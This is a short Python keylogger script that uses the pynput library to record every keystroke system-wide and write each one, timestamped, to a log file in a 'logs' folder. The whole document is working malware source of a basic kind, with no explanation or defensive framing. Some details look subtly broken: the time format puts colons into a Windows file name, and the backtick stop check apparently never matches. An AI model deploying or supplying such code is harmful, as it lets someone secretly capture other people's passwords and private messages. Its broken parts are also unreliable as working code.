from pynput.keyboard import Key, Listener
import logging
from datetime import datetime

log_dir = "logs\\"
current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
log_name = current_time + " KEYS.log"

logging.basicConfig(filename=(log_dir + log_name), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))
    if str(key) == '`':
        return False

with Listener(on_press=on_press) as listener:
    listener.join()